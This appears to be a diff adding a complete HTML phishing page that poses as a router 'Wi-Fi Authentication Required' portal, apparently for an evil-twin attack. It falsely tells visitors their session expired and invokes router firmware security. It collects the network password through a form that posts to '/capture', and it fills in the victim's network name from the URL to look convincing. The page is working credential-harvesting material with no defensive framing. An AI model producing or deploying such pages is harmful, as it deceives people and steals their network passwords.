@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Wi-Fi Authentication Required</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;color:#fff;font-family:'Segoe UI',Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#111;border:1px solid #2a2a2a;border-radius:18px;padding:36px 24px;max-width:400px;width:100%;box-shadow:0 0 60px rgba(255,23,68,0.12),0 4px 24px rgba(0,0,0,0.6)}
+.top{text-align:center;margin-bottom:28px}
+.icon{font-size:52px;margin-bottom:12px;animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.7}}
+h1{font-size:19px;font-weight:700;color:#fff;margin-bottom:6px;letter-spacing:-0.3px}
+.sub{font-size:12.5px;color:#666;line-height:1.5}
+.warn{background:#1a0800;border:1px solid #cc4400;border-radius:10px;padding:11px 14px;margin-bottom:22px;font-size:12px;color:#ff8844;text-align:center}
+.warn::before{content:"⚠ "}
+.field{margin-bottom:14px}
+label{display:block;font-size:11px;color:#777;margin-bottom:7px;font-weight:600;letter-spacing:.8px;text-transform:uppercase}
+input{width:100%;padding:14px 16px;background:#181818;border:1.5px solid #2a2a2a;border-radius:11px;color:#fff;font-size:15px;outline:none;transition:border-color .2s,box-shadow .2s;-webkit-appearance:none}
+input:focus{border-color:#FF1744;box-shadow:0 0 0 3px rgba(255,23,68,0.12)}
+.btn{width:100%;padding:16px;background:linear-gradient(135deg,#FF1744 0%,#c62828 100%);border:none;border-radius:11px;color:#fff;font-size:15px;font-weight:700;cursor:pointer;margin-top:6px;letter-spacing:.4px;transition:opacity .15s,transform .1s;-webkit-appearance:none}
+.btn:active{opacity:.88;transform:scale(0.99)}
+.divider{border:none;border-top:1px solid #1e1e1e;margin:20px 0}
+.info{font-size:11px;color:#444;text-align:center;line-height:1.6}
+.spinner{display:none;text-align:center;margin-top:16px;color:#FF1744;font-size:13px}
+.ssid-row{display:flex;align-items:center;gap:10px;background:#161616;border-radius:10px;padding:10px 14px;margin-bottom:22px}
+.ssid-row svg{flex-shrink:0;fill:#FF1744}
+.ssid-name{font-size:13px;font-weight:600;color:#ddd}
+.ssid-lock{font-size:11px;color:#666;margin-top:2px}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="top">
+    <div class="icon">📶</div>
+    <h1>Wi-Fi Authentication Required</h1>
+    <p class="sub">Your session expired. Re-enter your<br>Wi-Fi password to restore access.</p>
+  </div>
+
+  <div class="warn">Security verification required by router firmware</div>
+
+  <div class="ssid-row">
+    <svg width="20" height="20" viewBox="0 0 24 24"><path d="M1 9l2 2c5.11-5.11 13.37-5.11 18.48 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
+    <div>
+      <div class="ssid-name" id="ssid-label">Your Wi-Fi Network</div>
+      <div class="ssid-lock">WPA2-Personal · Locked</div>
+    </div>
+  </div>
+
+  <form id="loginForm" method="POST" action="/capture">
+    <div class="field">
+      <label>Network Password</label>
+      <input type="password" name="password" id="pwdInput" placeholder="Enter Wi-Fi password" required autocomplete="off" autocorrect="off" spellcheck="false">
+    </div>
+    <button type="submit" class="btn" id="submitBtn">CONNECT NOW</button>
+  </form>
+
+  <div class="spinner" id="spinner">Verifying credentials...</div>
+  <hr class="divider">
+  <p class="info">Router Management Portal &bull; v2.4.1<br>&copy; 2024 Network Services</p>
+</div>
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  document.getElementById('submitBtn').textContent = 'Connecting...';
+  document.getElementById('submitBtn').disabled = true;
+  document.getElementById('spinner').style.display = 'block';
+});
+// Try to get SSID from URL param or connection
+var urlParams = new URLSearchParams(window.location.search);
+var ssid = urlParams.get('ssid');
+if (ssid) document.getElementById('ssid-label').textContent = decodeURIComponent(ssid);
+</script>
+</body>
+</html>
